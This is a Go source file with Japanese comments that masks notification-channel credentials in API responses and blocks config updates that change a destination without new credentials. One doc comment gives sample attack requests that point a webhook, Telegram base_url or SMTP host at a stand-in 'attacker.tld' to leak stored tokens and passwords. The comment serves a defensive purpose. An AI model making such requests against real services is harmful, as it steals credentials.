package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix はマスク値の標識となる接頭辞。API が資格情報を返すときはこの
// 接頭辞付きの値で実体を置き換え、更新 API がこの接頭辞付きの値を受け取ったら
// 「DB 内の元の値を不変のまま維持する」と解釈する。
//
// 空文字列や固定の定数ではなく接頭辞にしているのは、識別のヒントを少しだけ
// 添えられるようにするため（MaskedValue を参照）。ユーザーは「これがどのボットか」
// を区別でき、キーを貼り直さずに済む。
const MaskedPrefix = "__masked__"

// MaskedValue はマスク値を生成する：
//
//	"__masked__"              元の値が短すぎてヒントを出さない
//	"__masked__:…ab12cd"      元の値の末尾 6 文字を識別ヒントとして付ける
//
// 末尾 6 文字だけを露出するのは意図的な選択：Webhook アドレスの識別情報は末尾に
// あり（WeCom の key、Lark のボット id など）、前方は各ボットで共通で識別価値がない。
// 末尾 6 文字では資格情報を復元できないが、設定者は「自分のあのグループだ」と
// 分かる。
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked はある値がマスク値かどうか（つまり API 応答後に変更されていないか）を
// 報告する。
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig は設定のコピーを返し、そのチャネルの資格情報フィールドをマスク値に
// 置き換える。
//
// 未知のチャネル種別では元の設定ではなく空の map を返す——UI に「設定は利用
// できません」と表示する方が、チャネル種別を識別できないときに資格情報を含みうる
// 元の内容を丸ごと吐き出すよりまし。資格情報以外のフィールドはそのまま残し、
// UI が正常に表示できるようにする。
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers のようなネスト構造は丸ごと 1 つの資格情報として扱う：サブキーを
		// 個別に判定するにはチャネルごとに「どのサブキーが資格情報か」の規則を
		// 宣言する必要があり、複雑さが利得をはるかに上回る。
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials は「宛先アドレスが変わったのに、呼び出し側が
// 資格情報フィールドについて意思表示していない」ことを表す。黙って通すのでも黙って
// 資格情報を捨てるのでもなくこれを返す理由は PrepareConfigUpdate を参照。
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 変化した宛先キー
	Missing []string // 明示的な意思表示のない資格情報キー
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "宛先アドレス（" + strings.Join(e.Changed, "、") + "）が変更されました。あわせて資格情報フィールド（" +
		strings.Join(e.Missing, "、") + "）を再入力してください：新しい値を入力するか、資格情報が不要なら明示的に空欄にしてください。" +
		"元の資格情報は旧アドレスにしか有効でなく、そのまま使い続けることは新しいアドレスへ渡すことに等しい。"
}

// PrepareConfigUpdate はチャネル設定をマージし、「宛先アドレスの変更」という
// セキュリティ上重要な状況を処理する。
//
// 生の MergeConfig の代わりにチャネル更新経路で使うもので、実際に成立した次の
// 経路を塞ぐ：宛先アドレス（メッセージをどこへ送るか）と資格情報（どの身分として
// 送るか）は独立した 2 系統のフィールドで、MergeConfig は「言及されていないキー」を
// 一律に DB の元の値で保持する。するとチャネルを PATCH できる者は、**アドレスだけ
// 変えて資格情報に触れずに素通りさせる**だけで、サーバーに DB の本物の資格情報を
// 自分が支配するエンドポイントへ送らせられる：
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 元の Authorization ヘッダーがリクエストと共に外へ
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<本物のToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 後にユーザー名とパスワードを渡す
//
// この経路は完全に静かで、リダイレクトにも依存せず（だからクロスホストのジャンプ
// 拒否では止められない）、しかも本パッケージのマスク機構の目的——「資格情報を
// ブラウザに返さない」——を直接突き崩す。
//
// 規則：宛先キーのいずれかが新しい値に変わったら、呼び出し側は**すべての**資格情報
// キーについて明示的に意思表示しなければならない：
//   - 新しい値を渡す → 新しい値を使う
//   - 明示的に空文字列を渡す → そのフィールドに資格情報は不要（クリアの意味は保持）
//   - マスク値をそのまま返す／キーにまったく触れない → 拒否
//
// 3 番目も拒否するのは、「マスク値」の意味がまさに「旧資格情報を引き継ぐ」であり、
// 旧資格情報は旧アドレスにしか有効でないため。ここで意図的に「資格情報を自動で
// 捨てる」ことをしないのは、任意の資格情報フィールド（webhook の headers、email の
// password）だと黙って「認証はなくなったのに API は 200 を返す」状態になり、エラー
// より原因究明が難しいから。操作者に 1 回余計に入力してもらう方がまし。
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("チャネル種別 %q は登録されていません", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 文字列でない資格情報の値（webhook の headers はオブジェクト）にマスクの
	// リテラルが埋まっている場合、呼び出し側が「元の値を維持」のセンチネルを構造体の
	// 内部に詰め込んだことを意味する。MergeConfig は「文字列かつ接頭辞付き」だけを
	// マスクと認識するので、この形は普通のオブジェクトとしてそのまま保存され——DB に
	// 本当にリテラル "__masked__" が残り、以後の認証が静かに失敗し、エラーも一切
	// 出ない。拒否する方がまし。
	//
	// この検査は**先頭**に置かなければならない：アドレスが変わっていないときは
	// 早期リターンするので、後ろに置くと「アドレス変更」という 1 経路しかカバー
	// できない（初版はそう置き間違え、テストが即座に捕まえた）。
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 実際に変更された宛先キーを探す。マスク値は「変更なし」と同じ。
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// アドレスは変わっていないので、通常のマージを通す（マスク値は元の値を保持、
		// 空文字列はクリア、それ以外は上書き）。
		return MergeConfig(stored, incoming), nil
	}

	// アドレスが変わった：すべての資格情報キーについて明示的な意思表示を要求する。
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers は、マスクのセンチネルを文字列でない構造に埋め込んで
// 送信することを拒否する。
//
// マスク機構の前提は「値全体が文字列であること」。webhook の headers のような
// オブジェクトフィールドは、丸ごとマスクする（文字列 "__masked__" にする）か丸ごと
// 送信するかしかできず、センチネルをオブジェクト内部に詰め込むと「変更しない」を
// 表現できず、しかも実値として DB に保存されてしまう。
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("フィールド %s の内容にマスク標識 %q が含まれています：このフィールドは丸ごと空欄にして引き継ぐか、丸ごと新しい値を送信するかしかできず、構造体の内部にマスクのプレースホルダーを紛れ込ませることはできません",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue は 2 つの設定値が等価かどうかを比較する。JSON シリアライズで
// 比較するのは、型の差異を一緒に処理するため——フロントが送るポートは number だが、
// DB から読み戻すと float64 で、直接 == で比べると誤判定する。
//
// 「空」は先に正規化してから比較しなければならない：空文字列と「キーが存在しない」は
// この設定モデルでは同じ状態であり、MergeConfig は空文字列を明示的クリアとみなして
// そのキーを delete する。正規化しないと、常に空欄の任意の宛先フィールド
// （Telegram の base_url が唯一そのようなフィールド：空欄なら公式アドレス）が
// この経路を辿ってしまう：
//
//	新規作成時に base_url:"" が保存される  →  最初の保存で MergeConfig がキーを削除
//	→ 2 回目の保存で incoming は ""、stored にはキーがないので「アドレスが変わった」と判定
//	→ 資格情報はマスク値 → 400「宛先アドレスが変更されました。あわせて資格情報フィールドを再入力してください」
//
// 以後、ユーザーが何も変えていないのに保存のたびに失敗し、Bot Token を貼り直すまで
// 直らない。
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue は設定値が「空」かどうかを判定する。
// 基準は MergeConfig のクリア判定（strings.TrimSpace(s) == ""）と一致させること。
// そうでないと「MergeConfig は削除すべきと考え、sameConfigValue は値ありと考える」
// 隙間が生まれる。
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig は incoming を stored の上にマージし、チャネル設定の更新に使う。
//
// 規則：
//   - incoming で値がマスクのキー → stored の元の値を保持（ユーザーがそのフィールドを変更していない）
//   - incoming で値が空文字列のキー → 明示的クリアとみなしてそのキーを削除
//   - それ以外のキー → incoming の値で上書き
//   - stored にあって incoming にないキー → 保持（部分更新の意味論）
//
// 空文字列を「クリア」とみなすかを明確にする必要がある：フロントのフォームは
// 未入力のフィールドを空文字列で送信するので、これを有効な値として書き込むと、
// 「空欄にして元の値を保持する」はずのフィールドを本当に消してしまう。
// ここでは明示的クリアを選ぶ。設定を誤ったフィールドを消したいときに、ユーザーには
// 他に表現する手段がないため（フィールドを外すことで「未指定」と「空値を指定」を
// 区別できるが、UI ではこの区別を使っていない）。
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // マスク値 = 未変更なので stored を保持
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
